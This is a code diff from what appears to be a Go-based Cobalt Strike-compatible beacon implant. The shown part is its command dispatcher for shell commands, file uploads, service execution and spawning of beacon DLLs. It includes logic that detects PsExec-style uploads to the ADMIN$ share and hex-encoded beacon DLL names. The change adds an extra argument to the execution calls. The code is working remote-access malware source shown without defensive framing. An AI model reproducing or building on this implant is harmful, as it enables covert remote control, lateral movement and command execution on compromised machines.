@@ -92,13 +92,13 @@ func main() {
 						var result []byte
 						switch cmdType {
 						case packet.CMD_TYPE_SHELL:
-							result, err = services.CmdShell(cmdBuf, Token)
+							result, err = services.CmdShell(cmdBuf, Token, argues)
 							callbackType = 0
 						case packet.CMD_TYPE_UPLOAD_START:
 							filePath, fileData := services.ParseCommandUpload(cmdBuf)
 							match := len(filePath) == 30 && bytes.HasPrefix(filePath, []byte("\\\\127.0.0.1\\ADMIN$\\")) && bytes.HasSuffix(filePath, []byte(".exe"))
 							if match && bytes.Contains(fileData, []byte("RegisterServiceCtrlHandlerA")) && len(fileData) > 250000 && len(fileData) < 350000 {
-								result, err = services.CmdService(Token)
+								result, err = services.CmdService(Token, argues)
 							} else {
 								result, err = services.CmdUploadStart(cmdBuf)
 							}
@@ -131,7 +131,7 @@ func main() {
 							bx64, _ := hex.DecodeString("626561636f6e2e7836342e646c6c") //beacon.x64.dll
 							if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx64) {
 								filename, _ := os.Executable()
-								result, err = services.CmdExecute([]byte(filename), Token)
+								result, err = services.CmdExecute([]byte(filename), Token, argues)
 							} else {
 								result, err = services.CmdSpawnX64(cmdBuf)
 							}
@@ -140,13 +140,13 @@ func main() {
 							bx86, _ := hex.DecodeString("626561636f6e2e646c6c") //beacon.dll
 							if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx86) {
 								filename, _ := os.Executable()
-								result, err = services.CmdExecute([]byte(filename), Token)
+								result, err = services.CmdExecute([]byte(filename), Token, argues)
 							} else {
 								result, err = services.CmdSpawnX86(cmdBuf)
 							}
 							callbackType = 0
 						case packet.CMD_TYPE_EXECUTE:
-							result, err = services.CmdExecute(cmdBuf, Token)
+							result, err = services.CmdExecute(cmdBuf, Token, argues)
 							callbackType = 0
 						case packet.CMD_TYPE_GETUID:
 							result, err = services.CmdGetUid()
